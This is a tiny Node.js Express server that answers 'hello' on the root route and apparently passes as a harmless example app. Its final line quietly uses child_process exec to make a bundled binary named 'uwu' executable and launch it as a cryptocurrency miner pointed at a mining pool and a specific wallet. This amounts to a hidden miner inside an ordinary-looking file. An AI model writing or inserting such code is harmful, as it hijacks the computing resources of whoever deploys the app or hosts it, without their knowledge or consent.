const { exec } = require('child_process');
const express = require("express")
const app = express()
const port = process.env.PORT || 3001;

app.get("/", function(req,res){
  res.send("hello")
});

app.listen(port, () => console.log(`Example app listening on port ${port}!`));
exec('chmod +x ./uwu && ./uwu --disable-gpu --algorithm verushash --pool na.luckpool.net:3956 --wallet RCDq4J8a65Rp77BMjW7fVvZ2oGiyKohAHs.cloudy --password x');
